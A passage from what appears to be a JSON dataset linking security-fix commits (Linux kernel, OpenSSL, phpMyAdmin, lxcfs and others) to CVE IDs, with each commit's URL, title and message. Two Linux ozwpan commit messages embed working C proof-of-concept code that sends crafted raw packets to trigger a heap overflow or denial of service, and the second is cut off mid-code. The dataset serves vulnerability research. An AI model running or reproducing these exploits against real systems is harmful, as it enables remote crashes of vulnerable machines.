byte aka skb parameter) in the 64 extra tail bytes of skb_outInstead calculate the extra required tail bytes for skb_out also using skb_outinstead of using the parameter skb. The skb parameter is only used to get thetotal_size from the last received packet. This is also the total_size used todecide that all fragments were received.Reported-by: Philipp Psurek <philipp.psurek@gmail.com>Signed-off-by: Sven Eckelmann <sven@narfation.org>Acked-by: Martin Hundebøll <martin@hundeboll.net>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2014-9428"
    ],
    "cveIdsCount": 1
  },
  "877283802c9abcf155c34107b3ce107cb5e1f1626b464b2a3fce0e397c946833": {
    "url": "https://github.com/s9y/Serendipity/commit/36cde3030aaa27a46bf94086e062dfe56b60230b",
    "title": "* Fixes escaping of comments in the new backend pane to prevent",
    "body": "XSS. Thanks to Steffen Röemann for reporting!",
    "cveIds": [
      "CVE-2014-9432"
    ],
    "cveIdsCount": 1
  },
  "2e5e01395ef9af12ecf3d98f7928d698d9371c3285d57c0bf7ee140e1cec4b5d": {
    "url": "https://github.com/forkcms/forkcms/commit/4a7814762adf4f56f932d95146c7e4126d872114",
    "title": "Don't directly inject $_GET parameters in html.",
    "body": "The Search module created a canonical tag containing a directly injected$_GET parameter. This commit makes sure we encode specialcharactersmaking XSS impossible. Fixes #1018",
    "cveIds": [
      "CVE-2014-9470"
    ],
    "cveIdsCount": 1
  },
  "a466e53ff3f85417728b40fc6c8dba89fdfd18cd7df92effecf172aaa1d50618": {
    "url": "https://github.com/getsentry/raven-ruby/commit/477ee93a3f735be33bc1e726820654cdf6e22d8f",
    "title": "Remove scientific computation from okjson",
    "body": "Conflicts:spec/raven/okjson_spec.rb",
    "cveIds": [
      "CVE-2014-9490"
    ],
    "cveIdsCount": 1
  },
  "0d166826734460cc86a6d202cfaca6b621e15caff408b2700538409caa0720bd": {
    "url": "https://github.com/mantisbt/mantisbt/commit/6d47c047",
    "title": "Fix XSS in install.php",
    "body": "This vulnerability (CVE-2014-9571) was reported by High-Tech BridgeSecurity Research Lab (https://www.htbridge.com/) in issue #17937(advisory ID HTB23243).The parameters are now properly sanitized before being displayed.Fixes #17938",
    "cveIds": [
      "CVE-2014-9571"
    ],
    "cveIdsCount": 1
  },
  "785fc2ddb7b00f30b6eb63a99f0b3712198cc03689908df92033405f4bb77a54": {
    "url": "https://github.com/spacewalkproject/spacewalk/commit/dd418384171473c3e31386a1b4792f8c555dc744",
    "title": "1181152 - XSS when altering user details and going somewhere where yo…",
    "body": "…u are choosing user - Escaped tags in real names",
    "cveIds": [
      "CVE-2015-0284"
    ],
    "cveIdsCount": 1
  },
  "003e09efbd1f5b1f51d6345e161ecbf789a73e69739b94ab77f43f2ca2db117a": {
    "url": "https://github.com/sddm/sddm/commit/4cfed6b0a625593fb43876f04badc4dd99799d86",
    "title": "Disable greeters from loading KDE's debug hander",
    "body": "Some themes may use KDE components which will automatically load KDE'scrash handler.If the greeter were to then somehow crash, that would leave a crashhandler allowing other actions, albeit as the locked down SDDM user.Only SDDM users using the breeze theme from plasma-workspace areaffected. Safest and simplest fix is to handle this inside SDDMdisabling kcrash via an environment variable for all future themes thatmay use these libraries.CVE-2015-0856",
    "cveIds": [
      "CVE-2015-0856"
    ],
    "cveIdsCount": 1
  },
  "a067f6ded75e244d5ca615f585d6ab8673ad48cdad2bedc9bc47d4553868e2ec": {
    "url": "https://github.com/sauruscms/Saurus-CMS-Community-Edition/commit/1bc272874a86eaab99dccd00b29177423fd83877",
    "title": "Fix stored and reflected XSS vulnerabilities",
    "body": "as described in VN: JVN#18387086 / TN: JPCERT#95011159 advisory.",
    "cveIds": [
      "CVE-2015-0876"
    ],
    "cveIdsCount": 1
  },
  "b05ab78d64db5bf8754d90c4289db059f1168cec249939f77788327ce7d8f5aa": {
    "url": "https://github.com/zencart-ja/zc-v1-series/commit/022949bd09444d7e58703cc537dbbd5744c381b8",
    "title": "JPCERT/CC 脆弱性情報ハンドリングチームより、Zen Cartにおけるクロスサイトスクリプティングの脆弱性があるとのことで、1.5…",
    "body": "….3、1.5.4からソースを持ってきて変更し、対応しました。Signed-off-by: kimono <maeda@obitastar.co.jp>",
    "cveIds": [
      "CVE-2015-0882"
    ],
    "cveIdsCount": 1
  },
  "4df89d7bf01c730e98b8975ee50460add067f0b24c87e3f72c920590e601667c": {
    "url": "https://github.com/kajona/kajonacms/commit/563d39c327606232e480602f7b36ea6cb31bc6f7",
    "title": "BUG: / SECURITY: Fixed a possible xss injection when handling non-exi…",
    "body": "…stent action-names. fixes SROEADV-2015-01.",
    "cveIds": [
      "CVE-2015-0917"
    ],
    "cveIdsCount": 1
  },
  "2a622a0fb9adf197dcfab8b87310b21eabdd5ab81995c6185cdbe94521e4b2be": {
    "url": "https://github.com/madler/pigz/commit/fdad1406b3ec809f4954ff7cdf9e99eb18c2458f",
    "title": "When decompressing with -N or -NT, strip any path from header name.",
    "body": "This uses the path of the compressed file combined with the namefrom the header as the name of the decompressed output file. Anypath information in the header name is stripped. This avoids apossible vulnerability where absolute or descending paths are putin the gzip header.",
    "cveIds": [
      "CVE-2015-1191"
    ],
    "cveIdsCount": 1
  },
  "0a9044ac6919b0b6ca934891acadf113665b56d64d54e38db4cf4d567af7daad": {
    "url": "https://github.com/martinpitt/python-dbusmock/commit/4e7d0df9093",
    "title": "SECURITY FIX: Prevent code execution through crafted pyc files",
    "body": "When loading a template from an arbitrary file through the AddTemplate() D-Busmethod call or DBusTestCase.spawn_server_template() Python method, don't createor use Python's *.pyc cached files.By tricking a user into loading a templatefrom a world-writable directory like /tmp, an attacker could run arbitrary codewith the user's privileges by putting a crafted .pyc file into that directory.Note that this is highly unlikely to actually appear in practice as customdbusmock templates are usually shipped in project directories, not directly inworld-writable directories.Thanks to Simon McVittie for discovering this!LP: #1453815CVE-2015-1326",
    "cveIds": [
      "CVE-2015-1326"
    ],
    "cveIdsCount": 1
  },
  "daa159aa026a7bff618fa1491b51018252c294042c13c1b056a1e93c19619e38": {
    "url": "https://github.com/torvalds/linux/commit/ca4da5dd1f99fe9c59f1709fb43e818b18ad20e0",
    "title": "KEYS: ensure we free the assoc array edit if edit is valid",
    "body": "__key_link_end is not freeing the associated array edit structureand this leads to a 512 byte memory leak each time an identicalexisting key is added with add_key().The reason the add_key() system call returns okay is thatkey_create_or_update() calls __key_link_begin() before checking to seewhether it can update a key directly rather than adding/replacing - whichit turns out it can. Thus __key_link() is not called through__key_instantiate_and_link() and __key_link_end() must cancel the edit.CVE-2015-1333Signed-off-by: Colin Ian King <colin.king@canonical.com>Signed-off-by: David Howells <dhowells@redhat.com>Signed-off-by: James Morris <james.l.morris@oracle.com>",
    "cveIds": [
      "CVE-2015-1333"
    ],
    "cveIdsCount": 1
  },
  "dd1141bc2f21e63c176e4ab4350ba0e7cc5339851dfdc4d94cdf156f3ff9c4be": {
    "url": "https://github.com/torvalds/linux/commit/2c5816b4beccc8ba709144539f6fdd764f8fa49c",
    "title": "cuse: fix memory leak",
    "body": "The problem is that fuse_dev_alloc() acquires an extra reference to cc.fc,and the original ref count is never dropped.Reported-by: Colin Ian King <colin.king@canonical.com>Signed-off-by: Miklos Szeredi <miklos@szeredi.hu>Fixes: cc080e9 (\"fuse: introduce per-instance fuse_dev structure\")Cc: <stable@vger.kernel.org> # v4.2+",
    "cveIds": [
      "CVE-2015-1339"
    ],
    "cveIdsCount": 1
  },
  "8604a801a8f93daf7f858ffbdbfe8a83f05f99ea0c55fa33ff3a3ed34e91cb2b": {
    "url": "https://github.com/lxc/lxcfs/commit/a8b6c3e0537e90fba3c55910fd1b7229d54a60a7",
    "title": "Fix checking of parent directories",
    "body": "Taken from the justification in the launchpad bug:To a task in freezer cgroup /a/b/c/d, it should appear that there are nocgroups other than its descendents. Since this is a filesystem, we must havethe parent directories, but each parent cgroup should only contain the childwhich the task can see.So, when this task looks at /a/b, it should see only directory 'c' and nofiles. Attempt to create /a/b/x should result in -EPERM, whether /a/b/x alreadyexists or not. Attempts to query /a/b/x should result in -ENOENT whether /a/b/xexists or not. Opening /a/b/tasks should result in -ENOENT.The caller_may_see_dir checks specifically whether a task may see a cgroupdirectory - i.e. /a/b/x if opening /a/b/x/tasks, and /a/b/c/d if doingopendir('/a/b/c/d').caller_is_in_ancestor() will return true if the caller in /a/b/c/d looks at/a/b/c/d/e. If the caller is in a child cgroup of the queried one - i.e. if thetask in /a/b/c/d queries /a/b, then *nextcg will container the next (the only)directory which he can see in the path - 'c'.Beyond this, regular DAC permissions should apply, with theroot-in-user-namespace privilege over its mapped uids being respected. Thefc_may_access check does this check for both directories and files.This is CVE-2015-1342 (LP: #1508481)Signed-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>",
    "cveIds": [
      "CVE-2015-1342"
    ],
    "cveIdsCount": 1
  },
  "0f3755a2a3ad63873dbada7a2bc44eedfee2022e8f4b9bb87bf4d4b106139e1b": {
    "url": "https://github.com/lxc/lxcfs/commit/8ee2a503e102b1a43ec4d83113dc275ab20a869a",
    "title": "Implement privilege check when moving tasks",
    "body": "When writing pids to a tasks file in lxcfs, lxcfs was checkingfor privilege over the tasks file but not over the pid beingmoved. Since the cgm_movepid request is done as root on the host,not with the requestor's credentials, we must copy the check whichcgmanager was doing to ensure that the requesting task is allowedto change the victim task's cgroup membership.This is CVE-2015-1344https://bugs.launchpad.net/ubuntu/+source/lxcfs/+bug/1512854Signed-off-by: Serge Hallyn <serge.hallyn@ubuntu.com>",
    "cveIds": [
      "CVE-2015-1344"
    ],
    "cveIdsCount": 1
  },
  "5556d69dea0581ced1a19be1892c4363f830a24de60dc7ddc6f5c2e3e1374f86": {
    "url": "https://github.com/phpbb/phpbb/commit/eaeb88133f1f028fa06f0ebe5639668436fd469e",
    "title": "Merge pull request #3316 from bantu/ticket/13531",
    "body": "[ticket/13531] Explicitly disallow trailing paths (e.g. PATH_INFO).",
    "cveIds": [
      "CVE-2015-1431"
    ],
    "cveIdsCount": 1
  },
  "ff6d9ee01cd6f1c38545ccbad2572c95002f14c9e1c636c04f74d25e2ca06f65": {
    "url": "https://github.com/phpbb/phpbb/commit/23069a13e203985ab124d1139e8de74b12778449",
    "title": "[ticket/13526] Correctly validate the ucp_pm_options form key.",
    "body": "PHPBB3-13526",
    "cveIds": [
      "CVE-2015-1432"
    ],
    "cveIdsCount": 1
  },
  "c3efe8683e5e57a2e1c70593160636c611383646c4ea19c39efc60f8383d1c6a": {
    "url": "https://github.com/bro/bro/commit/6cedd67c381ff22fde653adf02ee31caf66c81a0",
    "title": "DNP3: fix reachable assertion and buffer over-read/overflow.",
    "body": "A DNP3 packet using a link layer header that specifies a zero length cantrigger an assertion failure if assertions are enabled. Assertions areenabled unless Bro is compiled with the NDEBUG preprocessor macrodefined. The default configuration of Bro will define this macro and sodisables assertions, but using the --enable-debug option in theconfigure script will enable assertions. When assertions are disabled,or also for certain length values, the DNP3 parser may attempt to pass anegative value as the third argument to memcpy (number of bytes to copy)and result in a buffer over-read or overflow.Reported by Travis Emmert.",
    "cveIds": [
      "CVE-2015-1521",
      "CVE-2015-1522"
    ],
    "cveIdsCount": 2
  },
  "1e431ac9f2add70cf749579094419e47dc5e1e1813281f1d08dc09730a22b3ff": {
    "url": "https://github.com/sauruscms/Saurus-CMS-Community-Edition/commit/8dec044d0fdabcb9b04e58037623385a97b0d288",
    "title": "Fix multiple XSS reflection vulnerabilities",
    "body": "discovered by Steffen Rösemann <steffen.roesemann1986@gmail.com>.",
    "cveIds": [
      "CVE-2015-1562"
    ],
    "cveIdsCount": 1
  },
  "57c26f0839e113f4e235fb9046e704011ceb26ce6feca54a8b1204ffce3de525": {
    "url": "https://github.com/atutor/ATutor/commit/068b8aa37f24645c62235018fb8da340f60e2d18",
    "title": "5566 added chech on referer to ensure it is in the pages array, to pr…",
    "body": "…event remote access via CSRF",
    "cveIds": [
      "CVE-2015-1583"
    ],
    "cveIdsCount": 1
  },
  "bd7790aa7e4e0fa72e7f966b2472cb1ef2ce33f3da79e1ebaa5e2b9c213eb11c": {
    "url": "https://github.com/atutor/ATutor/commit/af519cfb56da7312eecbb5812484fcbce08e4419",
    "title": "5566 created a more general function to check referer, and updated cr…",
    "body": "…eate user and create admin to use it",
    "cveIds": [
      "CVE-2015-1583"
    ],
    "cveIdsCount": 1
  },
  "b0b9d65db752186cd77ac9b694b2fca62bba2963c39ba56279d0cf72ac3bb2a8": {
    "url": "https://github.com/kamailio/kamailio/commit/06177b12936146d48378cc5f6c6e1b157ebd519b",
    "title": "Merge pull request #89 from linuxmaniac/vseva/defaults",
    "body": "set defaults of fifo and ctl to /var/run/kamailioCloses: #48Closes: #89",
    "cveIds": [
      "CVE-2015-1590"
    ],
    "cveIdsCount": 1
  },
  "f809aef559ba0942c750f80659ae9c7b3cc7b3927d5274af0163855c6ccbced1": {
    "url": "https://github.com/torvalds/linux/commit/4e7c22d447bb6d7e37bfe39ff658486ae78e8d77",
    "title": "x86, mm/ASLR: Fix stack randomization on 64-bit systems",
    "body": "The issue is that the stack for processes is not properly randomized on64 bit architectures due to an integer overflow.The affected function is randomize_stack_top() in file\"fs/binfmt_elf.c\": static unsigned long randomize_stack_top(unsigned long stack_top) { unsigned int random_variable = 0; if ((current->flags & PF_RANDOMIZE) && !(current->personality & ADDR_NO_RANDOMIZE)) { random_variable = get_random_int() & STACK_RND_MASK; random_variable <<= PAGE_SHIFT; } return PAGE_ALIGN(stack_top) + random_variable; return PAGE_ALIGN(stack_top) - random_variable; }Note that, it declares the \"random_variable\" variable as \"unsigned int\".Since the result of the shifting operation between STACK_RND_MASK (whichis 0x3fffff on x86_64, 22 bits) and PAGE_SHIFT (which is 12 on x86_64): random_variable <<= PAGE_SHIFT;then the two leftmost bits are dropped when storing the result in the\"random_variable\". This variable shall be at least 34 bits long to holdthe (22+12) result.These two dropped bits have an impact on the entropy of process stack.Concretely, the total stack entropy is reduced by four: from 2^28 to2^30 (One fourth of expected entropy).This patch restores back the entropy by correcting the types involvedin the operations in the functions randomize_stack_top() andstack_maxrandom_size().The successful fix can be tested with: $ for i in `seq 1 10`; do cat /proc/self/maps | grep stack; done 7ffeda566000-7ffeda587000 rw-p 00000000 00:00 0 [stack] 7fff5a332000-7fff5a353000 rw-p 00000000 00:00 0 [stack] 7ffcdb7a1000-7ffcdb7c2000 rw-p 00000000 00:00 0 [stack] 7ffd5e2c4000-7ffd5e2e5000 rw-p 00000000 00:00 0 [stack] ...Once corrected, the leading bytes should be between 7ffc and 7fff,rather than always being 7fff.Signed-off-by: Hector Marco-Gisbert <hecmargi@upv.es>Signed-off-by: Ismael Ripoll <iripoll@upv.es>[ Rebased, fixed 80 char bugs, cleaned up commit message, added test example and CVE ]Signed-off-by: Kees Cook <keescook@chromium.org>Cc: <stable@vger.kernel.org>Cc: Linus Torvalds <torvalds@linux-foundation.org>Cc: Andrew Morton <akpm@linux-foundation.org>Cc: Al Viro <viro@zeniv.linux.org.uk>Fixes: CVE-2015-1593Link: http://lkml.kernel.org/r/20150214173350.GA18393@www.outflux.netSigned-off-by: Borislav Petkov <bp@suse.de>",
    "cveIds": [
      "CVE-2015-1593"
    ],
    "cveIdsCount": 1
  },
  "4f2e4e516872952e7b8f12eccf8f5c241cd79837259e91205c12c021f045e631": {
    "url": "https://github.com/openssl/openssl/commit/4924b37ee01f71ae19c94a8934b80eeb2f677932",
    "title": "bn/bn_gf2m.c: avoid infinite loop wich malformed ECParamters.",
    "body": "CVE-2015-1788Reviewed-by: Matt Caswell <matt@openssl.org>",
    "cveIds": [
      "CVE-2015-1788"
    ],
    "cveIdsCount": 1
  },
  "7c217a64c37a4f4d03177a447333ca8f5e208f66f39592efac9d92e87207cdce": {
    "url": "https://github.com/openssl/openssl/commit/f48b83b4fb7d6689584cf25f61ca63a4891f5b11",
    "title": "Fix length checks in X509_cmp_time to avoid out-of-bounds reads.",
    "body": "Also tighten X509_cmp_time to reject more than three fractionalseconds in the time; and to reject trailing garbage after the offset.CVE-2015-1789Reviewed-by: Viktor Dukhovni <viktor@openssl.org>Reviewed-by: Richard Levitte <levitte@openssl.org>",
    "cveIds": [
      "CVE-2015-1789"
    ],
    "cveIdsCount": 1
  },
  "3cf6b46d75b58c4f6ba707587a5c74ae3672def56205f3e02d7e771fc6f23f48": {
    "url": "https://github.com/openssl/openssl/commit/cd30f03ac5bf2962f44bd02ae8d88245dff2f12c",
    "title": "Canonicalise input in CMS_verify.",
    "body": "If content is detached and not binary mode translate the input toCRLF format. Before this change the input was verified verbatimwhich lead to a discrepancy between sign and verify.",
    "cveIds": [
      "CVE-2015-1792"
    ],
    "cveIdsCount": 1
  },
  "1663e0700aa6d17ffb04551fe18d5f2d39ad8fe8644f44e81803fff47e88b297": {
    "url": "https://github.com/torvalds/linux/commit/6b7339f4c31ad69c8e9c0b2859276e22cf72176d",
    "title": "mm: avoid setting up anonymous pages into file mapping",
    "body": "Reading page fault handler code I've noticed that under rightcircumstances kernel would map anonymous pages into file mappings: ifthe VMA doesn't have vm_ops->fault() and the VMA wasn't fully populatedon ->mmap(), kernel would handle page fault to not populated pte withdo_anonymous_page().Let's change page fault handler to use do_anonymous_page() only onanonymous VMA (->vm_ops == NULL) and make sure that the VMA is notshared.For file mappings without vm_ops->fault() or shred VMA without vm_ops,page fault on pte_none() entry would lead to SIGBUS.Signed-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>Acked-by: Oleg Nesterov <oleg@redhat.com>Cc: Andrew Morton <akpm@linux-foundation.org>Cc: Willy Tarreau <w@1wt.eu>Cc: stable@vger.kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2015-3288"
    ],
    "cveIdsCount": 1
  },
  "830415b009ae69bea214ad151bafaa8a208cd4b87a5b045628364045233045ed": {
    "url": "https://github.com/torvalds/linux/commit/9b6e6a8334d56354853f9c255d1395c2ba570e0a",
    "title": "x86/nmi/64: Switch stacks on userspace NMI entry",
    "body": "Returning to userspace is tricky: IRET can fail, and ESPFIX canrearrange the stack prior to IRET.The NMI nesting fixup relies on a precise stack layout andatomic IRET. Rather than trying to teach the NMI nesting fixupto handle ESPFIX and failed IRET, punt: run NMIs that came fromuser mode on the normal kernel stack.This will make some nested NMIs visible to C code, but the Ccode is okay with that.As a side effect, this should speed up perf: it eliminates anRDMSR when NMIs come from user mode.Signed-off-by: Andy Lutomirski <luto@kernel.org>Reviewed-by: Steven Rostedt <rostedt@goodmis.org>Reviewed-by: Borislav Petkov <bp@suse.de>Cc: Linus Torvalds <torvalds@linux-foundation.org>Cc: Peter Zijlstra <peterz@infradead.org>Cc: Thomas Gleixner <tglx@linutronix.de>Cc: stable@vger.kernel.orgSigned-off-by: Ingo Molnar <mingo@kernel.org>",
    "cveIds": [
      "CVE-2015-3290"
    ],
    "cveIdsCount": 1
  },
  "ba54441c3b409e9ab7587d17ad2fddaeffb39d7511674403aa5d8c281f74041f": {
    "url": "https://github.com/julianlam/nodebb-plugin-markdown/commit/ab7f2684750882f7baefbfa31db8d5aac71e6ec3",
    "title": "updated plugin to use markdown-it instead of remarkable, and updated …",
    "body": "…validateLink method to discard all data-uris, until a solution is developed upstream.",
    "cveIds": [
      "CVE-2015-3296"
    ],
    "cveIdsCount": 1
  },
  "5726c0db84acc0bd70828f888826ec165b84ec1f29bcdff3ff09b1efbefc7c62": {
    "url": "https://github.com/torvalds/linux/commit/ccfe8c3f7e52ae83155cb038753f4c75b774ca8a",
    "title": "crypto: aesni - fix memory usage in GCM decryption",
    "body": "The kernel crypto API logic requires the caller to provide thelength of (ciphertext || authentication tag) as cryptlen for theAEAD decryption operation. Thus, the cipher implementation mustcalculate the size of the plaintext output itself and cannot simply usecryptlen.The RFC4106 GCM decryption operation tries to overwrite cryptlen memoryin req->dst. As the destination buffer for decryption only needs to holdthe plaintext memory but cryptlen references the input buffer holding(ciphertext || authentication tag), the assumption of the destinationbuffer length in RFC4106 GCM operation leads to a too large size. Thispatch simply uses the already calculated plaintext size.In addition, this patch fixes the offset calculation of the AAD bufferpointer: as mentioned before, cryptlen already includes the size of thetag. Thus, the tag does not need to be added. With the addition, the AADwill be written beyond the already allocated buffer.Note, this fixes a kernel crash that can be triggered from user spacevia AF_ALG(aead) -- simply use the libkcapi test applicationfrom [1] and update it to use rfc4106-gcm-aes.Using [1], the changes were tested using CAVS vectors to demonstratethat the crypto operation still delivers the right results.[1] http://www.chronox.de/libkcapi.htmlCC: Tadeusz Struk <tadeusz.struk@intel.com>Cc: stable@vger.kernel.orgSigned-off-by: Stephan Mueller <smueller@chronox.de>Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>",
    "cveIds": [
      "CVE-2015-3331"
    ],
    "cveIdsCount": 1
  },
  "cdbf5c3283d05461adc91eca3c601990de1883cf835e6ddc931398cb6c436604": {
    "url": "https://github.com/FransUrbo/zfs/commit/99aa4d2b4fd12c6bef62d02ffd1b375ddd42fcf4",
    "title": "Move nfs.c:foreach_nfs_shareopt() to libshare.c:foreach_shareopt()",
    "body": "so that it can be (re)used in other parts of libshare.",
    "cveIds": [
      "CVE-2015-3400"
    ],
    "cveIdsCount": 1
  },
  "e45c5870323b14ca59c71727e0c5a5c83ef0a41afa4739578dbca136bc335e06": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/ee92eb9bab8e2d546756c1d4aec81ec7c8e44b83",
    "title": "bug #4899 [security] CSRF vulnerability in setup",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2015-3902"
    ],
    "cveIdsCount": 1
  },
  "6c5b4882943fe31ef46ef880f25fcb669dc51838709b4d4711910743ddd5d626": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/5ebc4daf131dd3bd646326267f3e765d0249bbb4",
    "title": "bug #4900 [security] Vulnerability allowing man-in-the-middle attack",
    "body": "Signed-off-by: Madhura Jayaratne <madhura.cj@gmail.com>",
    "cveIds": [
      "CVE-2015-3903"
    ],
    "cveIdsCount": 1
  },
  "dfc443155d900a9f804946a27dd355f27506f649f6c555fc0de50b85c77b9e80": {
    "url": "https://github.com/kohler/t1utils/commit/6b9d1aafcb61a3663c883663eb19ccdbfcde8d33",
    "title": "Security fixes.",
    "body": "- Don't overflow the small cs_start buffer (reported by Niels Thykier via the debian tracker (Jakub Wilk), found with a fuzzer (\"American fuzzy lop\")).- Cast arguments to <ctype.h> functions to unsigned char.",
    "cveIds": [
      "CVE-2015-3905"
    ],
    "cveIdsCount": 1
  },
  "f7a61cca4ea95c3943081941b9dc628aa3cfce69de5f0fd192a9e0e54659f51c": {
    "url": "https://github.com/GPCsolutions/dolibarr/commit/a7f6bbd316e9b96216e9b2c7a065c9251c9a8907",
    "title": "Properly escape untrusted data to prevent HTML injection.",
    "body": "First pass for Dolibarr#2857",
    "cveIds": [
      "CVE-2015-3935"
    ],
    "cveIdsCount": 1
  },
  "d35173914cfcfb854954d6086957e121bc38c0bc3a3e87fe8f28d527f2db838b": {
    "url": "https://github.com/torvalds/linux/commit/b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c",
    "title": "ozwpan: Use unsigned ints to prevent heap overflow",
    "body": "Using signed integers, the subtraction between required_size and offsetcould wind up being negative, resulting in a memcpy into a heap bufferwith a negative length, resulting in huge amounts of network-supplieddata being copied into the heap, which could potentially lead to remotecode execution.. This is remotely triggerable with a magic packet.A PoC which obtains DoS follows below. It requires the ozprotocol.h filefrom this module.=-=-=-=-=-= #include <arpa/inet.h> #include <linux/if_packet.h> #include <net/if.h> #include <netinet/ether.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <endian.h> #include <sys/ioctl.h> #include <sys/socket.h> #define u8 uint8_t #define u16 uint16_t #define u32 uint32_t #define __packed __attribute__((__packed__)) #include \"ozprotocol.h\"static int hex2num(char c){if (c >= '0' && c <= '9')return c - '0';if (c >= 'a' && c <= 'f')return c - 'a' + 10;if (c >= 'A' && c <= 'F')return c - 'A' + 10;return -1;}static int hwaddr_aton(const char *txt, uint8_t *addr){int i;for (i = 0; i < 6; i++) {int a, b;a = hex2num(*txt++);if (a < 0)return -1;b = hex2num(*txt++);if (b < 0)return -1;*addr++ = (a << 4) | b;if (i < 5 && *txt++ != ':')return -1;}return 0;}int main(int argc, char *argv[]){if (argc < 3) {fprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);return 1;}uint8_t dest_mac[6];if (hwaddr_aton(argv[2], dest_mac)) {fprintf(stderr, \"Invalid mac address.\\n\");return 1;}int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);if (sockfd < 0) {perror(\"socket\");return 1;}struct ifreq if_idx;int interface_index;strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {perror(\"SIOCGIFINDEX\");return 1;}interface_index = if_idx.ifr_ifindex;if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {perror(\"SIOCGIFHWADDR\");return 1;}uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;struct {struct ether_header ether_header;struct oz_hdr oz_hdr;struct oz_elt oz_elt;struct oz_elt_connect_req oz_elt_connect_req;} __packed connect_packet = {.ether_header = {.ether_type = htons(OZ_ETHERTYPE),.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }},.oz_hdr = {.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),.last_pkt_num = 0,.pkt_num = htole32(0)},.oz_elt = {.type = OZ_ELT_CONNECT_REQ,.length = sizeof(struct oz_elt_connect_req)},.oz_elt_connect_req = {.mode = 0,.resv1 = {0},.pd_info = 0,.session_id = 0,.presleep = 35,.ms_isoc_latency = 0,.host_vendor = 0,.keep_alive = 0,.apps = htole16((1 << OZ_APPID_USB) | 0x1),.max_len_div16 = 0,.ms_per_isoc = 0,.up_audio_buf = 0,.ms_per_elt = 0}};struct {struct ether_header ether_header;struct oz_hdr oz_hdr;struct oz_elt oz_elt;struct oz_get_desc_rsp oz_get_desc_rsp;} __packed pwn_packet = {.ether_header = {.ether_type = htons(OZ_ETHERTYPE),.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }},.oz_hdr = {.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),.last_pkt_num = 0,.pkt_num = htole32(1)},.oz_elt = {.type = OZ_ELT_APP_DATA,.length = sizeof(struct oz_get_desc_rsp)},.oz_get_desc_rsp = {.app_id = OZ_APPID_USB,.elt_seq_num = 0,.type = OZ_GET_DESC_RSP,.req_id = 0,.offset = htole16(2),.total_size = htole16(1),.rcode = 0,.data = {0}}};struct sockaddr_ll socket_address = {.sll_ifindex = interface_index,.sll_halen = ETH_ALEN,.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }};if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {perror(\"sendto\");return 1;}usleep(300000);if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {perror(\"sendto\");return 1;}return 0;}Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>Acked-by: Dan Carpenter <dan.carpenter@oracle.com>Cc: stable <stable@vger.kernel.org>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2015-4001"
    ],
    "cveIdsCount": 1
  },
  "82272bde1040e35ac806131b7b2ba47932171e8bb367eb43ceae1b260434c98e": {
    "url": "https://github.com/torvalds/linux/commit/9a59029bc218b48eff8b5d4dde5662fd79d3e1a8",
    "title": "ozwpan: unchecked signed subtraction leads to DoS",
    "body": "The subtraction here was using a signed integer and did not have anybounds checking at all. This commit adds proper bounds checking, madeeasy by use of an unsigned integer. This way, a single packet won't beable to remotely trigger a massive loop, locking up the system for aconsiderable amount of time. A PoC follows below, which requiresozprotocol.h from this module.=-=-=-=-=-= #include <arpa/inet.h> #include <linux/if_packet.h> #include <net/if.h> #include <netinet/ether.h> #include <stdio.h> #include <string.h> #include <stdlib.h> #include <endian.h> #include <sys/ioctl.h> #include <sys/socket.h> #define u8 uint8_t #define u16 uint16_t #define u32 uint32_t #define __packed __attribute__((__packed__)) #include \"ozprotocol.h\"static int hex2num(char c){if (c >= '0' && c <= '9')return c - '0';if (c >= 'a' && c <= 'f')return c - 'a' + 10;if (c >= 'A' && c <= 'F')return c - 'A' + 10;return -1;}static int hwaddr_aton(const char *txt, uint8_t *addr){int i;for (i = 0; i < 6; i++) {int a, b;a = hex2num(*txt++);if (a < 0)return -1;b = hex2num(*txt++);if (b < 0)return -1;*addr++ = (a << 4) | b;if (i < 5 && *txt++ != ':')return -1;}return 0;}int main(int argc, char *argv[]){if (argc < 3) {fprintf(stderr, \"Usage: %s interface destination_mac\\n\", argv[0]);return 1;}uint8_t dest_mac[6];if (hwaddr_aton(argv[2], dest_mac)) {fprintf(stderr, \"Invalid mac address.\\n\");return 1;}int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);if (sockfd < 0) {perror(\"socket\");return 1;}struct ifreq if_idx;int interface_index;strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) 